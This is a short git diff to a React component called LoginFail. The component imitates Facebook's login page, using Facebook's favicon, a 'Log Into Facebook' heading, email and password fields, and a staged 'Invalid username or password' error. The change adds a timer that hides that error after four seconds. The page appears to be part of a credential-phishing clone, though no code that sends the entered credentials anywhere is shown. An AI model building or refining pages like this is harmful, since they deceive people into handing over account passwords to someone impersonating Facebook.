@@ -1,8 +1,10 @@
-import React, { useEffect, useState } from 'react'
+import React, { useEffect, useState, useRef } from 'react'
 import Footer from './Footer'
 import './LoginFail.scss'
 
 export default function LoginFail() {
+  const errorSectionRef = useRef(null)
+
   useEffect(() => {
     const favicon = document.getElementById('favicon')
     favicon.href = 'https://static.xx.fbcdn.net/rsrc.php/yo/r/iRmz9lCMBD2.ico'
@@ -15,6 +17,12 @@ export default function LoginFail() {
 
   const [email, setEmail] = useState('')
   const [password, setPassword] = useState('')
+
+  useEffect(() => {
+    setTimeout(() => {
+      errorSectionRef.current.style.display = 'none'
+    }, 4000)
+  }, [])
 
   return (
     <>
@@ -29,7 +37,7 @@ export default function LoginFail() {
           <form className='loginFail__form'>
             <h4>Log Into Facebook</h4>
 
-            <div className='loginFail__form__error'>
+            <div className='loginFail__form__error' ref={errorSectionRef}>
               <h6>Wrong Credentails</h6>
               <p>Invalid username or password</p>
             </div>
